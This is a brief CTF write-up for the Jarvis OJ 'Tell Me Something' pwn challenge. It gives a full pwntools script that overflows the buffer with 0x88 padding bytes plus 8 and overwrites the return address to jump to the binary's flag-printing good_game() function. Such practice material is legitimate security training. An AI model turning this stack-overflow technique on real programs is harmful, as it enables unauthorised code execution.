#### Tell Me Something

binary: [guestbook.d3d5869bd6fb04dd35b29c67426c0f05](http://ctf.leaflxh.com:3000/Jarvis/pwn/guestbook.d3d5869bd6fb04dd35b29c67426c0f05)

>Do you have something to tell me?
>
>**nc pwn.jarvisoj.com 9876**



题目比较简单，程序自带打印flag的函数good_game()，只开了NX

```python
#!/usr/bin/python2
from pwn import *
import time

DEBUG = True

if DEBUG == True:
    process = process("./guestbook.d3d5869bd6fb04dd35b29c67426c0f05")
else:
    process = remote("pwn.jarvisoj.com", "9876")
    time.sleep(5)


payload = "A" * 0x88 + "B" * 8
payload += p64(0x400620) #ptr for good_game()

process.recv()
process.send(payload)
gdb.attach(process)
process.interactive()
```






